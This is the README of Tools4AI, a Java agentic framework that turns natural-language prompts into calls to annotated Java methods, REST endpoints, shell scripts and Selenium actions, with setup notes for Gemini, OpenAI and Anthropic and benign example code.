    <a target=""_blank"" href=""https://sonarcloud.io/summary/new_code?id=vishalmysore_Tools4AI""><img src=""https://sonarcloud.io/api/project_badges/measure?project=vishalmysore_Tools4AI&metric=vulnerabilities""/></a>
    <a target=""_blank"" href=""https://sonarcloud.io/summary/new_code?id=vishalmysore_Tools4AI""><img src=""https://sonarcloud.io/api/project_badges/measure?project=vishalmysore_Tools4AI&metric=sqale_rating""/></a>
    <a target=""_blank"" href=""https://sonarcloud.io/summary/new_code?id=vishalmysore_Tools4AI""><img src=""https://sonarcloud.io/api/project_badges/measure?project=vishalmysore_Tools4AI&metric=security_rating""/></a>
    <a target=""_blank"" href=""https://sonarcloud.io/summary/new_code?id=vishalmysore_Tools4AI""><img src=""https://sonarcloud.io/api/project_badges/measure?project=vishalmysore_Tools4AI&metric=reliability_rating""/></a>
    <a target=""_blank"" href=""https://github.com/vishalmysore/Tools4AI/actions/workflows/maven.yml""><img src=""https://github.com/vishalmysore/Tools4AI/actions/workflows/maven.yml/badge.svg""/></a>
    <a target=""_blank"" href=""https://github.com/vishalmysore/Tools4AI/actions/workflows/qodana_code_quality.yml""> <img src=""https://github.com/vishalmysore/Tools4AI/actions/workflows/qodana_code_quality.yml/badge.svg""/></a>
    <a target=""_blank"" href=""https://github.com/vishalmysore/Tools4AI/actions/workflows/codecov.yml""> <img src=""https://github.com/vishalmysore/Tools4AI/actions/workflows/codecov.yml/badge.svg""/></a>
    <a href=""https://codecov.io/gh/vishalmysore/Tools4AI"" > <img src=""https://codecov.io/gh/vishalmysore/Tools4AI/graph/badge.svg?token=9KLDLKUBW1""/> </a>
    <a href=""https://snyk.io/test/github/vishalmysore/tools4ai""><img src=""https://snyk.io/test/github/vishalmysore/tools4ai/badge.svg""/> </a>
    <a href=""https://central.sonatype.com/artifact/io.github.vishalmysore/tools4ai""> <img alt=""Maven Central Version"" src=""https://img.shields.io/maven-central/v/io.github.vishalmysore/tools4ai""></a>
    <img alt=""Test Number"" src=""https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/vishalmysore/edaa1463cc6a52c8dc82fc98017f5d2f/raw/test.json""/>
</p>





### Table of Contents
- [Rapid Start](#-Rapid-Start)
- [Tools4AI](#-Tools4AI)
- [SetUp](#setup)  
  - [Gemini](#gemini)
  - [OpenAI](#OpenAi)
  - [Anthropic](#anthropic)  
- [Reference Examples](#%EF%B8%8F-reference-examples)  
  - [Java Actions](#java-actions)
  - [HTTP REST Actions](#http-actions-swagger)
  - [Shell Actions](#shell-actions)
  - [Custom HTTP Actions](#custom-http-actions)
  - [Selenium Integration](#selenium-integration)
  - [Image Actions](#image-actions)
  - [Automated UI validation](#automated-ui-validations)
  - [Spring Integration](#spring-integration)
  - [JavaDocs](#-javadocs)
- [Prediction Loaders](#-prediction-loaders)  
  - [Java Prediction Loader](#-java-prediction-loaders)
  - [Swagger Prediction Loader](#%EF%B8%8F-swagger-prediction-loader)
  - [Shell Prediction Loader](#%EF%B8%8F-shell-prediction-loader)
  - [Extended Prediction Loader](#%EF%B8%8F-extended-prediction-loader)  
- [Response Validation](#response-validation)
  - [Hallucination](#hallucination)   
- [Autonomous Agent](#autonomous-agent)  
  - [Action Scripts](#action-script)


# ğŸ“Œ Rapid Start
ğŸ§± Do you want to start building ASAP , Look at Rapid start here https://github.com/vishalmysore/simplelam  

ğŸŒ± Integration of Spring Controller and AI Actions - https://github.com/vishalmysore/SpringActions  

ğŸ‘‰ Live Demo - https://huggingface.co/spaces/VishalMysore/EnterpriseAIHub


# ğŸ’¡ Tools4AI
Tools4AI is 100% Java based Agentic Framework which can be used to build Java based AI agents for integration with enterprise 
Java applications.
This project illustrates the integration of AI with enterprise tools or external tools, converting natural language prompts
into <span style=""font-size: larger;"">**actiona ble behaviors**.</span> These prompts can be called <span style=""font-size: larger;"">**""action prompts""**</span>
or <span style=""font-size: larger;"">**""actionable prompts""**</span>  By leveraging AI capabilities, it streamlines user interactions
with complex systems, enhancing productivity and innovation across diverse applications.<br>

For example , we can integrate AI with a customer service application. Users can interact with the AI system by asking<br> 
questions or making requests in natural language. For example, a user might ask,**""Schedule a maintenance <br>
appointment for my car.""** The AI system interprets the request, extracts relevant information such as the <br>
service required and preferred date, and then triggers the appropriate action in the customer service<br>
application to schedule the appointment. This seamless integration streamlines the process for users and<br>
enhances the efficiency of the customer service workflow.
<br>
| Prompt                                                                                                              | Action                                                                                                                                                |
|---------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------|
| Create a <span style=""color:blue"">**new task**</span> for the marketing campaign.                                                                                                     | The AI system interprets the request and generates a new task entry within the project management tool dedicated to the marketing campaign, assigning it relevant details such as priority level, due date, and task description. |
| Generate a <span style=""color:blue"">**sales report**</span> for the previous <span style=""color:blue"">**quarter**</span>.                                                                 | The AI system accesses data from the company's sales database, analyzes the information for the previous quarter, and generates a comprehensive sales report, which is then delivered to the user or stored in the appropriate location for access. |
| Check the <span style=""color:blue"">**inventory status**</span> of <span style=""color:blue"">**product X.**</span>                                                                           | The AI system retrieves real-time inventory data for product X from the inventory management system and provides the user with information regarding current stock levels, including quantities available, locations, and any pending orders. |
| Schedule a <span style=""color:blue"">**video conference**</span> with the engineering team for next Monday at 10 AM.                                      | The AI system interfaces with the calendar and scheduling tool, creates a new event titled ""Engineering Team Video Conference"" for the specified date and time, and sends out meeting invitations to all members of the engineering team. |
| Submit a reimbursement request for the <span style=""color:blue"">**business**</span> trip <span style=""color:blue"">**expenses.**</span>                                                     | The AI system guides the user through the reimbursement request process, collecting necessary details such as expense receipts, dates, amounts, and purpose of expenditure. Once compiled, the system submits the reimbursement request to the appropriate department for processing. |



Prompt prediction is a technique used to anticipate user actions based on their input prompts. For instance,
if a user's prompt is ""my car broke down,"" in addition to the action ""bookTaxi,"" the AI system can predict a
set of subsequent actions such as ""bookCarService"" and ""orderFood"" (if it's dinner time). This predictive
capability enhances the user experience by proactively suggesting relevant actions or services based on the
context provided in the prompt.

# SetUp

Download source and build from scratch

```mvn clean install``` <br>

if you are using Intellij or eclipse make sure you set -parameters option for compiler

Or use as maven dependency 
```
<dependency>
    <groupId>io.github.vishalmysore</groupId>
    <artifactId>tools4ai</artifactId>
    <version>0.9.6</version>
</dependency>

```
check for latest version here  https://repo1.maven.org/maven2/io/github/vishalmysore/tools4ai/

## Gemini
Make sure you have gcloud project set up and have enabled vertex API
```     
        String projectId = ""cookgptserver"" // this can be any server name you create in your GCloud
        String location = ""us-central1"";
        String modelName = ""gemini-1.0-pro"";
```
You have to mention your project id from Gcloud 

## OpenAI

If you plan to use OpenAI instead of Gemini you will need OpenAI api key
Instructions here https://help.openai.com/en/articles/4936850-where-do-i-find-my-openai-api-key

## Anthropic

If you plan to use Anthropic you will need anthropic api key https://docs.anthropic.com/claude/reference/getting-started-with-the-api


# âœˆï¸ Reference Examples
  
[OpenAI](src/test/java/com/t4a/test/OpenAIActionTest.java)
[Gemini](src/test/java/com/t4a/test/ActionTest.java)  
[Anthropic](src/test/java/com/t4a/test/AnthropicActionTest.java)  
[Gemini1.5Pro](src/test/java/com/t4a/test/AnthropicActionTest.java)  


## Java Actions

Fastest way to create action is by writing a java class  and  annotate its method with ```@Action```
annotation.

**Java Actions:** These are Java classes that have methods with ```@Action``` annotation . They are designed to 
perform specific actions based on prompts processed through Tools4AI.  

**@Predict Annotation:** This is a <u>class level</U> annotation. This annotation is used to add the action to the prediciton list, doing this will make sure
the action is called automatically when the prompt is processed and if the prompt matches with the action (action name or method name). All the methods 
in this class annotated with @Action will be added to the prediction list.

**@Action Annotation:** This is a <u>method level</u> annotation. The action method within the Java class is annotated with @Action to specify the action's behaviour
this is the actual method which will be triggered if the prompt matches by AI. You can have as many methods as you want with @Action
annotation in the class.

**Method Execution:** When a prompt like ""My friend's name is Vishal, I donâ€™t know what to cook for him today."" 
is processed, the ```whatFoodDoesThisPersonLike``` method is automatically called with ""Vishal"" as the argument, 
and it returns ""Paneer Butter Masala"" as Vishal's preference. 
``` 
@Predict
public class SimpleAction  {

    @Action( description = ""what is the food preference of this person"")
    public String whatFoodDoesThisPersonLike(String name) {
        if(""vishal"".equalsIgnoreCase(name))
            return ""Paneer Butter Masala"";
        else if (""vinod"".equalsIgnoreCase(name)) {
            return ""aloo kofta"";
        }else
            return ""something yummy"";
    }

}
```
This class can contain any number of methods both public or private. All the methods with ```@Action``` annotation  
in this class are going be added to the prediction list. In this case it is just ```whatFoodDoesThisPersonLike```.

This method can contain any number of parameters (Objects, Pojos, Arrays etc) and can be of have any return value, everythign will 
be mapped at runtime using prompt. ```@Action``` annotation also takes additional values for ActionRisk and Description.

When you send a prompt to  action processor (OpenAIActionProcessor, GeminiActionProcessor or AnthoripicActionProcessor)
``` 
 String cookPromptSingleText = ""My friends name is Vishal ,"" +
                ""I dont know what to cook for him today."";
 OpenAiActionProcessor tra = new OpenAiActionProcessor();
 String functionResponse = (String)tra.processSingleAction(cookPromptSingleText);
 //functionResponse will be Paneer Butter Masala
 String aiResponse = tra.query(cookPromptSingleText,functionResponse);
 //aiResponse will be well forumulated response something like ""Hey looks like your friend likes Panner Butter Masala
```

The above action will be called with ``` name = Vishal``` automatically based on the action name and prompt type.
AI will figure out that this is the correct action to call. You can also add grouping information in Predict annotation to 
make it even more targeted. You don't have to specify the Action explicitly if its not a High Risk action

**Convert prompt to Pojo**

You can convert any Prompt into a Java Pojo object. Your pojo can be simple or complex , it can have arrays, list
maps and other pojos and they all will be mapped based on the prompt

```
OpenAIPromptTransformer tra = new OpenAIPromptTransformer();
String promptText = ""Mhahrukh Khan works for MovieHits inc and his salary is $ 100  he joined Toronto on 
Labor day, his tasks are acting and dancing. He also works out of Montreal and Bombay. Krithik roshan is 
another employee of same company based in Chennai his taks are jumping and Gym he joined on Indian Independce
 Day"";
Organization org = (Organization) tra.transformIntoPojo(promptText, Organization.class.getName(),"""","""");
Assertions.assertTrue(org.getEm().get(0).getName().contains(""Mhahrukh""));
Assertions.assertTrue(org.getEm().get(1).getName().contains(""Krithik""));
```
The above code will map the prompt and convert into [Organization](src/test/java/com/t4a/examples/pojo/Organization.java) Pojo object 

**Trigger Action**

Trigger action based on prompt, in case its MyDiary action [MyDiaryAction](src/test/java/com/t4a/examples/actions/MyDiaryAction.java)

```
 OpenAiActionProcessor tra = new OpenAiActionProcessor();
 String promptText = ""I have dentist appointment on 3rd July, then i have Gym appointment on 7th August 
 and I am meeting famous Bollywood actor Shahrukh Khan on 19 Sep. My friends Rahul, Dhawal, Aravind are 
 coming with me. My employee Jhonny Napper is comign with me he joined on Indian Independce day.
 My customer name is Sumitabh Bacchan he wants to learn acting form me he joined on labor day"";
 MyDiaryAction action = new MyDiaryAction();
 MyDiary dict = (MyDiary) tra.processSingleAction(promptText,action);
 log.info(dict.toString()); 
```

If you do not specify any action then it will be predicted based on prompt and groups for example

```
MyDiary dict = (MyDiary) tra.processSingleAction(promptText)
```
As you can notice we are not passing any action with the prompt the AI will figure out the action correctly

A simple Java action can be written like this 

```
@Predict(groupName = ""buildMyDiary"" , groupDescription = ""This is my diary details"")
public class MyDiaryAction implements JavaMethodAction {
    @Action  
    public MyDiary buildMyDiary(MyDiary diary) {
        //take whatever action you want to take
        return diary;
    }
} 
```
Here the actionName is ```buildMyDiary```, MyDiary pojo will be created automatically based on prompt

**Action groups**

```
@Predict(groupName = ""personal"", groupDescription = ""all personal actions are here"") 
```
Actions have to be annontated with @Predict to be added to prediction list , they can be grouped together with
the groupName.

**Custom Pojo**

There are different annontations which be used for special Pojo mapping

**Mapping list**

```
    @ListType(Employee.class)
    List<Employee> em;
    @ListType(String.class)
    List<String> locations; 
```

**Mapping Maps in objects**
``` 
@Predict(actionName = ""addSports"",description = ""add new Sports into the map"")
public class MapAction implements JavaMethodAction {

    public Map<Integer,String> addSports(@MapKeyType(Integer.class)  @MapValueType(String.class) Map<Integer,String> mapOfSportsName) {

        return mapOfSportsName;
    }
}

```

**Special Instructions**

``` 
@Prompt(describe = ""convert this to Hindi"")
private String reasonForCalling;
```

The above instruction will fetch the reason for calling from the user prompt and convert it into Hindi and put
it inside the ```reasonForCalling``` String

**Ignore Field**
```
    @Prompt(ignore = true)
    private String location;
```
If you do not want to populate a field you can annotate it as ignore

**Format Date**

```
    @Prompt(dateFormat = ""yyyy-MM-dd"" ,describe = ""if you dont find date provide todays date in fieldValue"")
    private Date dateJoined;
```
The above will fetch the dateJoined from the prompt and convert it into the format. So if your prompt is
""Book my dinner reservation on Indian Independence day"" , the dateJoined will be 2024-08-15

**Muliple Special Prompts**
```
 public class MyTranslatePojo {
    @Prompt(describe = ""translate to Hindi"")
    String answerInHindi;
    @Prompt(describe = ""translate to Punjabi"")
    String answerInPunJabi;

    @Prompt(describe = ""translate to Tamil"")
    String answerInTamil;
}
```
The above Pojo can be used to translate the prompt in multiple language and populate the result in variables

``` 
OpenAIPromptTransformer tra = new OpenAIPromptTransformer();
String promptTxt = ""paneer is so good"";
MyTranslatePojo myp = (MyTranslatePojo)tra.transformIntoPojo(promptTxt,MyTranslatePojo.class.getName());
System.out.println(myp);
```

Result will look something like this 

``` MyTranslatePojo(answerInHindi=à¤ªà¤¨à¥€à¤° à¤‡à¤¤à¤¨à¤¾ à¤…à¤šà¥à¤›à¤¾ à¤¹à¥ˆ, answerInPunJabi=à¨ªà¨¨à©€à¨° à¨¬à¨¹à©à¨¤ à¨µà¨§à©€à¨† à¨¹à©ˆ, answerInTamil=à®ªà®©à¯€à®°à¯ à®à®ªà¯à®ªà®Ÿà®¿ à®¨à®²à¯à®²à®¤à¯) ```

**High Risk Actions**  
There might be some actions which you do not want to be triggered automatically but passed explicitly in the processor
such actions can be annotated with HighRisk

```
@Predict(actionName = ""restartTheECOMServer"",description = ""will be used to restart the server"" , 
riskLevel = ActionRisk.HIGH, groupName = ""customer support"", 
groupDescription = ""actions related to customer support"")
public class ServerRestartAction implements JavaMethodAction {
    public String restartTheECOMServer(String reasonForRestart, String requestedBy) {
        return "" Server has been restarted by ""+requestedBy+"" due to following reason ""+reasonForRestart;
    }
}

```
The above action is marked as High Risk action so if you try to call it with simple prompt

``` 
OpenAiActionProcessor processor = new OpenAiActionProcessor()
String restartPrompt = ""Hey I am Vishal , restart the server as its very slow "";
String functionResponse = (String)processor.processSingleAction(""restartPrompt"");

```
It will not be triggered even though the AI will correct identify which action to trigger still it will get blocked.

You will have to call it explicitly this way

``` 
OpenAiActionProcessor processor = new OpenAiActionProcessor()
String restartPrompt = ""Hey I am Vishal , restart the server as its very slow "";
ServerRestartAction restartAction = new ServerRestartAction();
String functionResponse = (String)processor.processSingleAction(""restartPrompt"", restartAction);
```


## HTTP Actions (Swagger)

Any application exposing HTTP REST API can be converted into actions for example here is my sample [swagger_actions.json.](https://huggingface.co/spaces/VishalMysore/EnterpriseAIHub/blob/main/swagger_actions.json)
All the REST calls such as get, post, put, delete will be mapped to actions and based on the prompts they can be triggered
automatically

``` 
{
  ""endpoints"" : [
    {
      ""swaggerurl"": ""https://fakerestapi.azurewebsites.net/swagger/v1/swagger.json"",
      ""group"": ""Books Author Activity"",
      ""description"": ""This is for all the actions related books , Authors, photos and users trying to read books and view photos"",
      ""baseurl"": ""https://fakerestapi.azurewebsites.net/"",
      ""id"": ""fakerestapi""
    },
    {
      ""swaggerurl"": ""https://petstore3.swagger.io/api/v3/openapi.json"",
      ""baseurl"": ""https://petstore3.swagger.io/"",
      ""group"": ""Petstore API"",
      ""description"": ""This is for all the actions related to pets"",
      ""id"": ""petstore""
    } ,
    {
      ""swaggerurl"": ""https://vishalmysore-instaservice.hf.space/v3/api-docs"",
      ""baseurl"": ""https://vishalmysore-instaservice.hf.space/"",
      ""group"": ""Enterprise Support and Tickeing System"",
      ""description"": ""This action is to create tickets track bugs across the enterprise"",
      ""id"": ""InstaService""
    }      
  ]
}
```

Books related api are put in a group called Books Author Activity group, similarly Petstore API is group for all the rest calls exposed by Petstore app 
if you provide a prompt ""create a ticket for me with number 1 and issue is compture not working"" 
it will automatically create a ticket on InstaService you can view the logs here https://huggingface.co/spaces/VishalMysore/InstaService?logs=container

```
@Test
public void testHttpActionOpenAI() throws AIProcessingException, IOException {
  OpenAiActionProcessor processor = new OpenAiActionProcessor();
  String postABook = ""post a book harry poster with id 189 the publish date is 2024-03-22 and the description 
  is about harry who likes poster its around 500 pages  "";
  String result = (String)processor.processSingleAction(postABook);
  Assertions.assertNotNull(result);
  String success = TestHelperOpenAI.getInstance().sendMessage(""Look at this message - ""+result+"" -
   was it a success? - Reply in true or false only"");
  log.debug(success);
  Assertions.assertTrue(""True"".equalsIgnoreCase(success));

} 
```
This will automatically trigger HTTP post call with correct parameters 

Read the complete link on how this has been deployed [here](https://www.linkedin.com/pulse/enterprise-ai-hub-llm-agent-built-openai-java-vishal-mysore-0p7oc/?trackingId=iZoQDW3%2BTH6j0%2FkbEMUxFw%3D%3D)


## Shell Actions 

Any kind of script can be coverted into Action for function calling by configuring the script in [shell_actions.yml](src/test/resources/shell_actions.yaml)
```
groups:
  - name: Employee Actions
    description : This is actions for all the new employees
    scripts:
      - scriptName: ""test_script.cmd""
        actionName: saveEmployeeInformation
        parameters: employeeName,employeeLocation
        description: This is a command which will save employee information
		
```

Here we are creating a group called Employee Actions and adding an action called ``` saveEmployeeInformation``` into the group. The parameters it takes are ```employeeName ``` and ```employeeLocation ```
Calling and actionprocessor with these kinds of prompt will trigger this Action
``` 
 OpenAiActionProcessor tra = new OpenAiActionProcessor();
 String promptText = ""A new employee joined today in Toronto. Her name is Madhuri Khanna""; 
 tra.processSingleAction(promptText);
 
```
		
As You can notice we are not passing the action explicitly , it will be predicted by the AI at runtime and triggered.


## Custom HTTP Actions

If you do not have swagger URL and would like to configure HTTP rest end points it can be done via Custom HTTP Actions by configuring them in [http_actions.json](src/test/resources/http_actions.json)


``` 
{
  ""endpoints"": [
    {
      ""actionName"": ""getUserDetails"",
      ""description"" : "" this will fetch User details from the user inventory corporate application"",
      ""url"": ""https://api.example.com/users/"",
      ""type"": ""GET"",
      ""input_object"": [
      {
        ""name"": ""userId"",
        ""type"": ""path_parameter"",
        ""description"": ""User ID""
      }
      ],

      ""output_object"": {
        ""type"": ""json"",
        ""description"": ""User object""
      },
      ""auth_interface"": {
        ""type"": ""Bearer Token"",
        ""description"": ""Authentication token required""
      }
    },
    {
      ""actionName"": ""somethingNotVeryUseful"",
      ""url"": ""https://api.example.com/temperature"",
      ""description"" : "" this will get real time temperature from the weather api"",
      ""type"": ""GET"",
      ""input_object"":[
        {
          ""name"": ""locationId"",
          ""type"": ""query_parameter"",
          ""description"": ""Location ID""
      }
      ],
      ""output_object"": {
        ""type"": ""json"",
        ""description"": ""Real-time temperature data""
      },
      ""auth_interface"": {
        ""type"": ""API Key"",
        ""description"": ""API key required""
      }
    }
  ]
}

```
## Image Actions
Tools4AI uses Gemini (gemini-1.0-pro-vision) to enhance AI capabilities by enabling the system to analyze images
and automatically execute relevant actions based on the visual data it processes. This development is 
particularly crucial in emergency management, where speed and accuracy of response can save lives and property.

Reference code is [here](https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/ImageActionExample.java)

Detailed article on the same is avaiable [here](https://medium.com/@visrow/image-recognition-and-function-calling-with-gemini-and-java-e28b0356d3de)
```  
package org.example.image;

import com.t4a.processor.AIProcessingException;
import com.t4a.processor.GeminiImageActionProcessor;
import com.t4a.processor.GeminiV2ActionProcessor;

public class ImageActionExample {
    public static void main(String[] args) throws AIProcessingException {
        GeminiImageActionProcessor processor = new GeminiImageActionProcessor();
        String imageDisription = processor.imageToText(args[0]);
        GeminiV2ActionProcessor actionProcessor = new GeminiV2ActionProcessor();
        Object obj = actionProcessor.processSingleAction(imageDisription);
        String str  = actionProcessor.summarize(imageDisription+obj.toString());
        System.out.println(str);
    }
}
```
 <img src=""accident.png""  width=""300"" height=""300"">

If you execute the [ImageActionExample](https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/ImageActionExample.java) 
with above image as source it correctly identifies that we need to call Ambulance 

``` 
The image depicts a car accident involving a blue car and a red car on a city street. The blue car has front-end damage while the red car has rear-end damage. Debris from the accident is scattered on the street and a 
police officer is present at the scene. An ambulance has been called and is seen in the background.
```

Direct Action from Visual Cues: Whether it's a surveillance image of a car accident or a live feed of a residential fire, Tools4AI can immediately recognize critical situations and initiate appropriate emergency protocols without human input.
A sample action is written and the code is available [here](https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/action/EmergencyAction.java)
``` 
@Predict(actionName = ""callEmergencyServices"", description = ""This action will be called in case of emergency"", groupName = ""emergency"")
public class EmergencyAction implements JavaMethodAction {
    public String callEmergencyServices(@Prompt(describe = ""Ambulance, Fire or Police"") String typeOfEmergency) {
        return typeOfEmergency+"" has been called"";
    }
} 
```
## Automated UI Validations

Images can also be converted into Json and Pojos for UI based validations. You can use selenium with Tools4AI 
to validated your UI instead of using elements from the web page , more details [here](https://medium.com/@visrow/selenium-and-ai-ui-validations-with-ai-1799ab2f305e)  

 <img src=""auto.PNG""  width=""300"" height=""300"">

The above image can be converted into a Pojo object with help of Tools4AI

```  
WebDriverManager.chromedriver().setup();

ChromeOptions options = new ChromeOptions();
options.addArguments(""--headless"");  // Setting headless mode
ptions.addArguments(""--disable-gpu"");  // GPU hardware acceleration isn't useful in headless mode
options.addArguments(""--window-size=1920,1080"");  // Set the window size
WebDriver driver = new ChromeDriver(options);

driver.get(""https://google.com"");
// Your code to interact with the page and take screenshots
// Take screenshot and save it as file or use as bytes
TakesScreenshot ts = (TakesScreenshot) driver;
byte[] screenshotBytes = ts.getScreenshotAs(OutputType.BYTES);
GeminiImageActionProcessor imageActionProcessor = new GeminiImageActionProcessor();
imageActionProcessor.imageToText(screenshotBytes)
//File srcFile = ts.getScreenshotAs(OutputType.FILE);
//File destFile = new File(""screenshot.png"");
//FileHandler.copy(srcFile, destFile);
driver.quit();
```

The pojo it will convert to is 

``` 
import lombok.*;
@Getter
@Setter
@ToString
@NoArgsConstructor
@AllArgsConstructor
public class AutoRepairScreen {
    double fullInspectionValue;
    double tireRotationValue;
    double oilChangeValue;
    Integer phoneNumber;
    String email;
    String[] customerReviews;
}
```

Integrating Tools4AI with Selenium offers a revolutionary approach to UI validation, streamlining the testing 
process by validating UI elements in their entirety. Rather than the traditional method of scrutinizing each 
element individually, this integration enables comprehensive, automated verification of tags and elements.
It simplifies the UI Validation workflow, ensuring accuracy and efficiency in confirming the UI's adherence to design specifications  

## Selenium integration
Tools4AI's integration with Selenium introduces a flexible way to automate UI testing. Instead of traditional
Java code for Selenium scripts, Tools4AI allows you to define test scenarios in plain English, offering a more 
accessible approach to testing web applications. These English-based commands can be converted into Selenium 
code to automate web-based interactions and streamline testing.  

**Example of Selenium Test with Tools4AI**
``` 
 WebDriver driver = new ChromeDriver(options);
 SeleniumProcessor processor = new SeleniumProcessor(driver);
 processor.processWebAction(""go to website https://the-internet.herokuapp.com"");
 boolean buttonPresent =  processor.trueFalseQuery(""do you see Add/Remove Elements?"");
 if(buttonPresent) {
    processor.processWebAction(""click on Add/Remove Elements"");
    // perform other function in simple english
 } //else {
   // processor.processSingleAction(""Create Jira by taking screenshot"");
  // }
 processor.processWebAction(""go to website https://the-internet.herokuapp.com"");
 boolean isCheckboxPresent =  processor.trueFalseQuery(""do you see Checkboxes?"");
 if(isCheckboxPresent) {
   processor.processWebAction(""click on Checkboxes"");
   processor.processWebAction(""select checkbox 1"");
 }
```
In this example, the ```SeleniumProcessor``` processes commands in plain English and converts them into Selenium 
actions. This approach allows for complex interactions without manually writing Java code for each test. 
Tools4AI serves as a bridge between natural language and Selenium, making it easier to automate UI testing in
a way that is both efficient and intuitive.  

This integration offers substantial benefits for teams looking to streamline their UI validation process.
By enabling a more straightforward way to define and execute Selenium scripts, Tools4AI provides a flexible
framework for automating Selenium-based tests.  

## Spring integration

All the action processors have Spring integration as well 

``` 
SpringAnthropicProcessor springAnthropic = new SpringAnthropicProcessor(applicationContext)
```
``` 
SpringGeminiProcessor springGemini = new SpringGeminiProcessor();
```

```  
SpringOpenAIProcessor springOpenAI = new SpringOpenAIProcessor();
```

You can use this for spring injection and it works exactly as all other action processors , only difference is
that instead of creating new action beans it will reuse the beans already created by spring


look at the example here https://github.com/vishalmysore/SpringActions



## ğŸ“˜ JavaDocs

Look at the java docs here - https://javadoc.io/doc/io.github.vishalmysore/tools4ai/latest/index.html


## ğŸ§± Prediction Loaders

### ğŸ”‘ Java Prediction Loaders

All the classes implementing ```JavaMethodAction``` interfaces and having annotation ```@Predict``` are added to prediction list
```JavaMethodAction``` is integral to creating all AI-related actions, with each action implemented as a function adhering to the principles of functional programming. The function's name should be descriptive, aligning closely with the action it performs
```@Predict``` Annotation: This annotation ensures that the AIAction object is included in our prediction list. While not mandatory, it's advisable to mark all actions with @Predict for automatic execution. However, for highly customized actions like deleting records or canceling reservations, omitting this annotation might be preferable to prevent automatic execution.

```actionName``` the descriptive name of the primary function within the class. It's crucial to name this function accurately, as AI utilizes semantic mapping at runtime to correlate the function.

```
@Predict(actionName = ""whatFoodDoesThisPersonLike"", description = ""what is the food preference of this person "")
public class SimpleAction implements JavaMethodAction {

    public String whatFoodDoesThisPersonLike(String name) {
        if(""vishal"".equalsIgnoreCase(name))
            return ""Paneer Butter Masala"";
        else if (""vinod"".equalsIgnoreCase(name)) {
            return ""aloo kofta"";
        }else
            return ""something yummy"";
    }

}

```

So prompt like ```Hey Vishal is coming to my house for dinner``` will automatically trigger method ```whatFoodDoesThisPersonLike``` with ```name``` Vishal

### ğŸ–Œï¸ Shell Prediction Loader  

The prediction loader is responsible for loading command scripts, shell scripts, Python scripts, or any other
type of script from configuration files. It utilizes the actionName field from the configuration to map to 
prompts in real-time. Here's an example configuration entry: 

```
- scriptName: ""test_script.cmd""
  actionName: saveEmployeeInformation
  parameters: employeeName,employeeLocation
  description: This is a command which will save employee information
 ```
During runtime, the prediction loader dynamically extracts parameters from the prompt. Subsequently, it invokes 
the corresponding script based on the action name. Upon execution, the script processes the parameters and 
generates a result, which is then sent back to the AI system.  Finally, the AI system formulates a response based on the received result and provides feedback accordingly.
User: ""Hey, Bahubali joined the IFC and we are so happy.""

In this prompt:

""Hey"" serves as a casual greeting.
""Bahubali"" represents the name of the new joiner, which needs to be extracted as a parameter.
""joined the IFC"" implies an action, where the specifics of the action need to be determined. ""IFC"" is the name of the organization.
""we are so happy"" provides additional context but doesn't directly affect the action to be taken.
The AI system first matches the user's intent with a list of all available actions. In this case, it selects the ""saveEmployeeInformation"" action as the best match. Then, it maps the parameters accordingly: ""Bahubali"" as the employee's name and ""IFC"" as the organization's name. This allows the AI system to accurately understand and execute the user's request.

### âœ’ï¸ Swagger Prediction Loader  
<img src=""restapi.png"" >

The Swagger Prediction Loader is capable of directly loading HTTP endpoints as predictions, enabling automatic
execution of commands that semantically match the endpoints with extracted parameters. The screenshot provided
is from https://fakerestapi.azurewebsites.net/index.html, included as an example. Each endpoint within this 
API is converted to an ```HttpPredictedAction``` and dynamically added to the prediction list in real-time by the 
```SwaggerPredictionLoader.``` 

This seamless integration allows for streamlined execution of commands based on the available HTTP endpoints.
**Parsing Swagger/OpenAPI Specification:** The Swagger Prediction Loader reads the Swagger/OpenAPI specification file, which describes the available endpoints, their methods (e.g., GET, POST), parameters, and other details.

**Endpoint Extraction:** The loader extracts each endpoint from the specification, along with its associated metadata such as method, path, parameters, etc.

**Action Mapping:** For each endpoint, the loader creates an HttpPredictedAction object. This action represents the corresponding HTTP operation (e.g., GET, POST) that clients can perform on the endpoint.

**Parameter Extraction:** The loader extracts parameters defined for each endpoint, such as query parameters, path parameters, headers, etc.

**Action Configuration:** The extracted parameters are configured within the HttpPredictedAction object, allowing for dynamic parameterization during execution. Parameters may be mapped to placeholders within the endpoint URL or included in the request body, headers, etc., as specified by the endpoint definition.

**Addition to Prediction List:** Finally, the HttpPredictedAction objects are added to the prediction list, making them available for automatic execution based on user prompts. Users can invoke actions by providing prompts that match the semantic intent of the mapped endpoints, and the system will execute the corresponding HTTP operation with the extracted parameters.

In essence, the Swagger Prediction Loader leverages the structure and metadata defined in the Swagger/OpenAPI
specification to dynamically create HttpPredictedAction objects, allowing for seamless integration of HTTP
endpoints into the prediction system

### âœï¸ Http Prediction Loader

```HttpPredictionLoader``` is responsible for loading the manual http endpoint configuration which look something like this 

```{
  ""endpoints"": [
    {
      ""actionName"": ""getUserDetails"",
      ""description"" : "" this will fetch User details from the user inventory corporate application"",
      ""url"": ""https://api.example.com/users/"",
      ""type"": ""GET"",
      ""input_object"": [
      {
        ""name"": ""userId"",
        ""type"": ""path_parameter"",
        ""description"": ""User ID""
      }
      ],

      ""output_object"": {
        ""type"": ""json"",
        ""description"": ""User object""
      },
      ""auth_interface"": {
        ""type"": ""Bearer Token"",
        ""description"": ""Authentication token required""
      }
    },
```
For the manual definition of HTTP endpoints using a configuration file like the one provided, the process involves specifying each endpoint along with its associated details such as action name, description, URL, HTTP method (type), input parameters, output object, and authentication interface. Here's how the mapping process occurs:

**Configuration File Parsing:** The application parses the configuration file to extract each endpoint definition along with its metadata.

**Endpoint Mapping:** For each endpoint defined in the configuration file, an HttpPredictedAction object is created to represent the corresponding HTTP operation.

**Action Configuration:** The metadata provided in the configuration file is used to configure the HttpPredictedAction object:

**Action Name:** Specifies the name of the action, which serves as a unique identifier.  
**Description:** Provides a brief description of what the action does or its purpose.  
**URL:** Defines the endpoint URL to which the HTTP request will be sent.  
**HTTP Method (Type):** Specifies the HTTP method (e.g., GET, POST) to be used for the request.  
**Input Parameters:** Describes the input parameters required for the HTTP request, such as path parameters, query parameters, etc.  
**Output Object:** Defines the format and structure of the response expected from the endpoint.  
